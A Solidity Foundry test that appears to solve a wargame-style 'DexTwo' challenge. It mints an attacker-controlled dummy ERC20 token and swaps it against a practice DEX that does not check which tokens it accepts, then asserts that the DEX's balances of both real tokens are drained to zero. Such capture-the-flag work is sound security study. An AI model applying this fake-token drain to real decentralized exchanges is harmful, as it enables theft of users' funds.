// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "forge-std/console.sol";
import "src/Dex2.sol";
import "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";

contract Dex2Test is Test {
    DexTwo private dex;
    SwappableTokenTwo private token1;
    SwappableTokenTwo private token2;
    Token1 private token3;
    address private constant HACKER = address(0x3);

    function setUp() external {
        dex = new DexTwo();
        token1 = new SwappableTokenTwo(address(dex), "Swappable1", "SWTKN1", HACKER); // DEX receives 100 TKN, HACKER receives 10 TKN
        token2 = new SwappableTokenTwo(address(dex), "Swappable2", "SWTKN2", HACKER); // DEX receives 100 TKN, HACKER receives 10 TKN
        token3 = new Token1(address(dex), "Token1", "TKN1", HACKER);  // HACKER receives 1e18
        dex.setTokens(address(token1), address(token2));
        vm.deal(HACKER, 5e18);
        vm.startPrank(HACKER);
    }

    function helper() private view{
        console.log("#DEX#");
        uint bal0 = token1.balanceOf(address(dex));
        uint bal1 = token2.balanceOf(address(dex));
        console.log(bal0, bal1);
    }
    function testHack() external {
        IERC20(token3).approve(address(dex), 1e18);
        dex.swap(address(token3), address(token1), 1e18);
        assertEq(IERC20(token1).balanceOf(address(dex)), 0);

        IERC20(token3).approve(address(dex), 2e18);
        dex.swap(address(token3), address(token2), 2e18);
        assertEq(IERC20(token2).balanceOf(address(dex)), 0);
        vm.stopPrank();
    }
}

contract Token1 is ERC20 {
    constructor(address dex, string memory name, string memory symbol, address hacker) ERC20(name, symbol){
        _mint(dex, 1e18);
        _mint(hacker, 3e18);   
    }
}